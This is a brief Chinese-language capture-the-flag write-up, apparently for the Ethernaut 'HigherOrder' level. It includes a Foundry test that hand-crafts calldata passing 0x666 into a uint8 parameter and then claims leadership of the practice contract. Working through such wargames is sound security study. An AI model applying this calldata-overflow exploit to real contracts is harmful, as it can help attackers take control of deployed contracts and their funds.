依然是使用底层的 calldata 获取数据，直接构造 calldata 即可。这里在对应位置上写了 `0x666`。不过在 solidity 0.8 版本当 calldata 对 uint8 溢出时会出现报错了。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/HigherOrder.sol";
import "src/levels/HigherOrderFactory.sol";

contract TestHigherOrder is BaseTest {
    HigherOrder private level;

    constructor() public {
        levelFactory = new HigherOrderFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = HigherOrder(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        bytes memory _calldata = abi.encodePacked(bytes4(keccak256("registerTreasury(uint8)")),
                                                  bytes32(uint256(0x666)));
        (bool success, ) = address(level).call(_calldata);
        console.log(success);

        level.claimLeadership();

        vm.stopPrank();
    }
}
```

